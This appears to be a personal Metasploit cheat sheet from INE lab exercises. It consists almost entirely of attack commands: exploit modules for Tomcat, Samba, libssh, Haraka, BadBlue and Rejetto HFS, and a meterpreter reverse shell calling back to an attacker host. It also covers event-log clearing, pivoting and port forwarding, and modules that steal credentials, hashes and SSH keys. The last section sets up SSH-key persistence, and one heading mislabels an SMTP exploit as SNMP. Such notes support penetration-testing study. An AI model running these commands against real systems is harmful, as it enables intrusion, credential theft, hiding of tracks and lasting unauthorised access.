## Tomcat (Java web server)
multi/http/tomcat_jsp_upload_bypass
    set RHOSTS
    run
cd:/
type flag.txt


## samba
    use exploit/linux/samba/is_known_pipename
        set RHOST demo.ine.local
        check
        exploit
## ssh
    use auxiliary/scanner/ssh/libssh_auth_bypass
        set RHOSTS demo.ine.local
        set SPAWN_PTY true
        exploit

## snmp
    use exploit/linux/smtp/haraka
        set SRVPORT 9898
        set email_to root@attackdefense.test
        set payload linux/x64/meterpreter_reverse_http
        set rhost demo.ine.local
        set LHOST 192.164.31.2
        exploit

## badblue
    windows/http/badblue_passthru
        run

## RDP
    windows/manage/enable_rdp

    xfreerdp /u:Administrator /p:admin_123 /v:demo.ine.local

## clear events
 meterpreter 
    clearev

## pivot
    windows/http/rejetto_hfs_exec
        run autoroute -s 192.168.0.0
    
    sessions -i 1
portfwd add -l 1234 -p 80 -r <IP Address of demo2.ine.local>
portfwd list

ipconfig
10.2.26.186


## linux post
    post/linux/gather/enum_configs
        loot
    post/multi/gather/env
    post/linux/gather/enum_network
    post/linux/gather/enum_protections
    post/linux/gather/enum_system
    post/linux/gather/checkcontainer
    post/linux/gather/checkvm
    post/linux/gather/enum_users_history
    post/multi/manage/system_session
    post/linux/manage/download_exec


## elevate privs unix
    ps aux
    // if cron
        cat /bin/check-down
        command -v chkrootkit
        /bin/chkrootkit -V 
        // if chkrootkit vwesion<= 0.5
            use exploit/unix/local/chkrootkit
            set CHKROOTKIT /bin/chkrootkit
            set session 1
            set LHOST 192.60.22.2
            exploit
            
            cat /root/flag

## linux post
    post/multi/gather/ssh_creds
    post/multi/gather/docker_creds
    post/linux/gather/hashdump
    post/linux/gather/ecryptfs_creds
    post/linux/gather/enum_psk
    post/linux/gather/enum_xchat
    post/linux/gather/phpmyadmin_credsteal
    post/linux/gather/pptpd_chap_secrets
    post/linux/manage/sshkey_persistence

## persisitence linux
 // most have root access
    use post/linux/manage/sshkey_persistence
    set SESSION 4
    set CREATESSHFOLDER true

    cp /root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt ssh_key
    chmod 0400 ssh_key

    ssh -i ssh_key root@demo.ine.local